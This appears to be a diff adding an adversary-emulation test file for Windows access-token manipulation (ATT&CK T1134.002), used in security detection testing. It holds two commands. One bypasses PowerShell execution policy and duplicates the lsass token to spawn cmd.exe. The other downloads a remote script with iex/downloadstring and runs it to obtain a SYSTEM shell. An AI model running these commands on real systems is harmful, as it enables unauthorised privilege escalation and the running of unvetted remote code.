@@ -1,0 +1,39 @@
+atomic_tests:
+- auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+  description: "This Action demonstrates how an access token for a specific program\
+    \ can spawn another program under a different owner. \nAdversaries can leverage\
+    \ access tokens to run programs under a different user not only to achieve privilege\
+    \ escalation but also to evade detection by blending in with normal user activity.\
+    \ \nThis Action will query all processes and list the process name and owner.It\
+    \ will then make a copy of an existing token to create a new instance of cmd.exe\n"
+  executor:
+    command: 'Set-ExecutionPolicy -Scope Process Bypass -Force
+
+      #{path_GetToken_script}; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"#{path_spawned_program}")
+
+      '
+    elevation_required: true
+    name: powershell
+  input_arguments:
+    path_GetToken_script:
+      default: C:\Users\anis\Desktop\GetToken.ps1
+      description: path to the GetToken.ps1 script (to get privileged token)
+      type: path
+    path_spawned_program:
+      default: C:\windows\system32\cmd.exe
+      description: path to the program spawned
+      type: path
+  name: Access Token Manipulation
+  supported_platforms:
+  - windows
+- auto_generated_guid: ccf4ac39-ec93-42be-9035-90e2f26bcd92
+  description: Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+    via function of WinPwn
+  executor:
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+    name: powershell
+  name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+  supported_platforms:
+  - windows
+attack_technique: T1134.002
+display_name: Create Process with Token
